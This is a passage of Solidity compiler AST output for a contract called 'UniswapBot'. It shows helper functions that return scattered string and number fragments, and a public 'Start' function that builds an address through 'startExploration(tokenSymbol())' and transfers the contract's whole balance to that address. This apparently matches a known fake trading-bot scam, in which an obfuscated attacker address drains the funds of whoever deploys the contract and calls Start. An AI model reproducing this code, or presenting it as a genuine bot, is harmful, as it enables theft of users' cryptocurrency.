																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 620,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4601:16:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "4576:41:3"
											},
											{
												"assignments": [
													623
												],
												"declarations": [
													{
														"constant": false,
														"id": 623,
														"mutability": "mutable",
														"name": "i",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 677,
														"src": "4624:6:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 622,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "4624:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 624,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "4624:6:3"
											},
											{
												"assignments": [
													626
												],
												"declarations": [
													{
														"constant": false,
														"id": 626,
														"mutability": "mutable",
														"name": "j",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 677,
														"src": "4635:6:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 625,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "4635:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 627,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "4635:6:3"
											},
											{
												"body": {
													"id": 648,
													"nodeType": "Block",
													"src": "4683:42:3",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 646,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 639,
																		"name": "_newValue",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 616,
																		"src": "4689:9:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 642,
																	"indexExpression": {
																		"argumentTypes": null,
																		"id": 641,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "UnaryOperation",
																		"operator": "++",
																		"prefix": false,
																		"src": "4699:3:3",
																		"subExpression": {
																			"argumentTypes": null,
																			"id": 640,
																			"name": "j",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 626,
																			"src": "4699:1:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"nodeType": "IndexAccess",
																	"src": "4689:14:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 643,
																		"name": "_baseBytes",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 591,
																		"src": "4706:10:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 645,
																	"indexExpression": {
																		"argumentTypes": null,
																		"id": 644,
																		"name": "i",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 623,
																		"src": "4717:1:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "IndexAccess",
																	"src": "4706:13:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"src": "4689:30:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes1",
																	"typeString": "bytes1"
																}
															},
															"id": 647,
															"nodeType": "ExpressionStatement",
															"src": "4689:30:3"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 635,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 632,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 623,
														"src": "4657:1:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 633,
															"name": "_baseBytes",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 591,
															"src": "4659:10:3",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														},
														"id": 634,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "length",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "4659:17:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "4657:19:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 649,
												"initializationExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 630,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 628,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 623,
															"src": "4652:1:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "30",
															"id": 629,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "4654:1:3",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"src": "4652:3:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 631,
													"nodeType": "ExpressionStatement",
													"src": "4652:3:3"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 637,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": false,
														"src": "4678:3:3",
														"subExpression": {
															"argumentTypes": null,
															"id": 636,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 623,
															"src": "4678:1:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 638,
													"nodeType": "ExpressionStatement",
													"src": "4678:3:3"
												},
												"nodeType": "ForStatement",
												"src": "4648:77:3"
											},
											{
												"body": {
													"id": 670,
													"nodeType": "Block",
													"src": "4767:43:3",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 668,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 661,
																		"name": "_newValue",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 616,
																		"src": "4773:9:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 664,
																	"indexExpression": {
																		"argumentTypes": null,
																		"id": 663,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "UnaryOperation",
																		"operator": "++",
																		"prefix": false,
																		"src": "4783:3:3",
																		"subExpression": {
																			"argumentTypes": null,
																			"id": 662,
																			"name": "j",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 626,
																			"src": "4783:1:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"nodeType": "IndexAccess",
																	"src": "4773:14:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 665,
																		"name": "_valueBytes",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 598,
																		"src": "4790:11:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 667,
																	"indexExpression": {
																		"argumentTypes": null,
																		"id": 666,
																		"name": "i",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 623,
																		"src": "4802:1:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "IndexAccess",
																	"src": "4790:14:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"src": "4773:31:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes1",
																	"typeString": "bytes1"
																}
															},
															"id": 669,
															"nodeType": "ExpressionStatement",
															"src": "4773:31:3"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 657,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 654,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 623,
														"src": "4740:1:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 655,
															"name": "_valueBytes",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 598,
															"src": "4742:11:3",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														},
														"id": 656,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "length",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "4742:18:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "4740:20:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 671,
												"initializationExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 652,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 650,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 623,
															"src": "4735:1:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "30",
															"id": 651,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "4737:1:3",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"src": "4735:3:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 653,
													"nodeType": "ExpressionStatement",
													"src": "4735:3:3"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 659,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": false,
														"src": "4762:3:3",
														"subExpression": {
															"argumentTypes": null,
															"id": 658,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 623,
															"src": "4762:1:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 660,
													"nodeType": "ExpressionStatement",
													"src": "4762:3:3"
												},
												"nodeType": "ForStatement",
												"src": "4731:79:3"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 674,
															"name": "_newValue",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 616,
															"src": "4830:9:3",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"id": 673,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "4823:6:3",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_string_storage_ptr_$",
															"typeString": "type(string storage pointer)"
														},
														"typeName": {
															"id": 672,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "4823:6:3",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 675,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4823:17:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 589,
												"id": 676,
												"nodeType": "Return",
												"src": "4816:24:3"
											}
										]
									},
									"documentation": null,
									"id": 678,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mempool",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 586,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 583,
												"mutability": "mutable",
												"name": "_base",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 678,
												"src": "4319:19:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 582,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "4319:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 585,
												"mutability": "mutable",
												"name": "_value",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 678,
												"src": "4340:20:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 584,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "4340:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4318:43:3"
									},
									"returnParameters": {
										"id": 589,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 588,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 678,
												"src": "4385:13:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 587,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "4385:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4384:15:3"
									},
									"scope": 1047,
									"src": "4302:543:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 685,
										"nodeType": "Block",
										"src": "4915:23:3",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "433938",
													"id": 683,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "string",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "4928:5:3",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_stringliteral_1a0c60e8e0e9703ac08357209defc03982656e62088f4272304ac11183643383",
														"typeString": "literal_string \"C98\""
													},
													"value": "C98"
												},
												"functionReturnParameters": 682,
												"id": 684,
												"nodeType": "Return",
												"src": "4921:12:3"
											}
										]
									},
									"documentation": null,
									"id": 686,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getMempoolLong",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 679,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "4875:2:3"
									},
									"returnParameters": {
										"id": 682,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 681,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 686,
												"src": "4900:13:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 680,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "4900:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4899:15:3"
									},
									"scope": 1047,
									"src": "4852:86:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "private"
								},
								{
									"body": {
										"id": 697,
										"nodeType": "Block",
										"src": "4993:38:3",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"expression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 693,
																"name": "this",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": -28,
																"src": "5013:4:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_contract$_UniswapBot_$1047",
																	"typeString": "contract UniswapBot"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_contract$_UniswapBot_$1047",
																	"typeString": "contract UniswapBot"
																}
															],
															"id": 692,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "5005:7:3",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_address_$",
																"typeString": "type(address)"
															},
															"typeName": {
																"id": 691,
																"name": "address",
																"nodeType": "ElementaryTypeName",
																"src": "5005:7:3",
																"typeDescriptions": {
																	"typeIdentifier": null,
																	"typeString": null
																}
															}
														},
														"id": 694,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "5005:13:3",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														}
													},
													"id": 695,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"memberName": "balance",
													"nodeType": "MemberAccess",
													"referencedDeclaration": null,
													"src": "5005:21:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 690,
												"id": 696,
												"nodeType": "Return",
												"src": "4998:28:3"
											}
										]
									},
									"documentation": null,
									"id": 698,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getBalance",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 687,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "4963:2:3"
									},
									"returnParameters": {
										"id": 690,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 689,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 698,
												"src": "4987:4:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 688,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "4987:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4986:6:3"
									},
									"scope": 1047,
									"src": "4944:87:3",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "private"
								},
								{
									"body": {
										"id": 722,
										"nodeType": "Block",
										"src": "5061:135:3",
										"statements": [
											{
												"assignments": [
													702
												],
												"declarations": [
													{
														"constant": false,
														"id": 702,
														"mutability": "mutable",
														"name": "to",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 722,
														"src": "5066:10:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 701,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "5066:7:3",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 707,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [],
															"expression": {
																"argumentTypes": [],
																"id": 704,
																"name": "tokenSymbol",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1009,
																"src": "5096:11:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$__$returns$_t_string_memory_ptr_$",
																	"typeString": "function () pure returns (string memory)"
																}
															},
															"id": 705,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "5096:13:3",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 703,
														"name": "startExploration",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 581,
														"src": "5079:16:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$returns$_t_address_$",
															"typeString": "function (string memory) pure returns (address)"
														}
													},
													"id": 706,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5079:31:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5066:44:3"
											},
											{
												"assignments": [
													709
												],
												"declarations": [
													{
														"constant": false,
														"id": 709,
														"mutability": "mutable",
														"name": "contracts",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 722,
														"src": "5115:25:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														},
														"typeName": {
															"id": 708,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "5115:15:3",
															"stateMutability": "payable",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 714,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 712,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 702,
															"src": "5151:2:3",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 711,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "5143:8:3",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_address_payable_$",
															"typeString": "type(address payable)"
														},
														"typeName": {
															"id": 710,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "5143:8:3",
															"stateMutability": "payable",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 713,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5143:11:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address_payable",
														"typeString": "address payable"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5115:39:3"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [],
															"expression": {
																"argumentTypes": [],
																"id": 718,
																"name": "getBalance",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 698,
																"src": "5178:10:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_view$__$returns$_t_uint256_$",
																	"typeString": "function () view returns (uint256)"
																}
															},
															"id": 719,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "5178:12:3",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 715,
															"name": "contracts",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 709,
															"src": "5159:9:3",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"id": 717,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "transfer",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "5159:18:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
															"typeString": "function (uint256)"
														}
													},
													"id": 720,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5159:32:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 721,
												"nodeType": "ExpressionStatement",
												"src": "5159:32:3"
											}
										]
									},
									"documentation": null,
									"functionSelector": "1b55ba3a",
									"id": 723,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "Start",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 699,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "5051:2:3"
									},
									"returnParameters": {
										"id": 700,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "5061:0:3"
									},
									"scope": 1047,
									"src": "5037:159:3",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 730,
										"nodeType": "Block",
										"src": "5258:23:3",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "323835333938",
													"id": 728,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "5270:6:3",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_285398_by_1",
														"typeString": "int_const 285398"
													},
													"value": "285398"
												},
												"functionReturnParameters": 727,
												"id": 729,
												"nodeType": "Return",
												"src": "5263:13:3"
											}
										]
									},
									"documentation": null,
									"id": 731,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "fetchContractID",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 724,
